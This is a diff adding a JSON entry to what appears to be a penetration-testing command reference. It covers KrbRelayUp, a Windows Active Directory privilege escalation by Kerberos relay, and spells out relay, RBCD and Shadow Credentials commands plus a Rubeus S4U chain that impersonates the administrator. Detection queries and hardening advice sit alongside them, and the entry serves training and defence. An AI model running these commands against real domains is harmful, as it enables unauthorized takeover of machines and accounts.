@@ -1,0 +1,102 @@
+{
+  "id": "ad-krbrelayup",
+  "name": "KrbRelayUp - Local Privilege Escalation via Kerberos Relay",
+  "command": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!",
+  "description": "KrbRelayUp chains LDAP signing abuse with RBCD or Shadow Credentials for local privilege escalation - all from a single unprivileged machine, no second box needed. Creates a machine account, sets RBCD on the target, then requests a service ticket to impersonate admin.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Dec0ne/KrbRelayUp; modern AD attack research",
+  "tags": [
+    "krbrelayup",
+    "kerberos-relay",
+    "rbcd",
+    "shadow-credentials",
+    "local-privesc",
+    "ldap-signing"
+  ],
+  "mitre": [
+    "T1557",
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nKrbRelayUp abuses the lack of LDAP signing enforcement to relay\nKerberos auth from the local machine account to LDAP. It then sets\nRBCD or Shadow Credentials on the computer object, letting you\nimpersonate any user (e.g. administrator) to the local machine.\n\n=== RBCD METHOD (default) ===\n  KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!\n  KrbRelayUp.exe spawn -m rbcd -d corp.local -dc dc01.corp.local -cn YOURPC$ -cp Pass123!\n\n=== SHADOW CREDENTIALS METHOD ===\n  KrbRelayUp.exe relay -Domain corp.local -ShadowCredentials\n  KrbRelayUp.exe spawn -m shadowcred -d corp.local -dc dc01.corp.local\n\n=== FULL ATTACK MANUAL ===\n  # Step 1: Create machine account via relay\n  KrbRelayUp.exe relay -d corp.local -CreateNewComputerAccount -cn YOURPC$ -cp Pass123!\n  # Step 2: Request TGS with S4U2Self/S4U2Proxy\n  Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt\n  # Step 3: Use the ticket\n  dir \\\\target\\C$\n\n=== REQUIREMENTS ===\n- LDAP signing NOT enforced (default in most environments)\n- MachineAccountQuota >= 1 (or existing machine account credentials)\n- Domain controller reachable via LDAP",
+  "examples": [
+    {
+      "label": "RBCD relay and spawn",
+      "command": "KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass123!"
+    },
+    {
+      "label": "Shadow Credentials method",
+      "command": "KrbRelayUp.exe relay -Domain corp.local -ShadowCredentials"
+    },
+    {
+      "label": "Manual S4U chain after RBCD",
+      "command": "Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt"
+    }
+  ],
+  "references": [
+    {
+      "title": "KrbRelayUp - GitHub",
+      "url": "https://github.com/Dec0ne/KrbRelayUp"
+    },
+    {
+      "title": "LDAP Relay Attack Research",
+      "url": "https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-shadow-credentials",
+      "note": "Shadow Credentials is one of the two KrbRelayUp impersonation methods.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-impacket-rbcd",
+      "note": "RBCD is the default KrbRelayUp impersonation path.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "When LDAP signing is not enforced, the local machine can relay its own Kerberos authentication to LDAP and modify its own computer object to add RBCD or Shadow Credentials.",
+    "prerequisites": "LDAP signing not enforced (default); MachineAccountQuota >= 1 or existing machine account.",
+    "impact": "Local privilege escalation to SYSTEM/Domain Admin without needing a second machine.",
+    "detection": "[MITRE T1557] New computer account creation + msDS-AllowedToActOnBehalfOfOtherIdentity modification on existing computer objects; suspicious S4U2Self/S4U2Proxy ticket requests.",
+    "artifacts": "Event 4741 (computer account created); Event 5136 (directory service changes); Event 4769 (Kerberos service ticket with S4U).",
+    "splunk_spl": "index=wineventlog EventCode=5136 AttributeLDAPDisplayName=\"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| table _time, SubjectUserName, ObjectDN, AttributeValue",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"msDS-AllowedToActOnBehalfOfOtherIdentity\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, SubjectUserName, ObjectDN",
+    "sigma_rules": "win_ad_rbcd_delegation_change",
+    "prevention": "Enforce LDAP signing (GPO: Domain controller: LDAP server signing requirements = Require signing); set MachineAccountQuota to 0; monitor RBCD/Shadow Credential changes.",
+    "sources": [
+      "https://github.com/Dec0ne/KrbRelayUp",
+      "https://attack.mitre.org/techniques/T1557/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "KrbRelayUp - RBCD delegation modification",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1557",
+          "T1550.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate RBCD configuration by admins",
+        "tuning": "Correlate with Event 4741 (new computer account) within same timeframe"
+      }
+    ]
+  }
+}
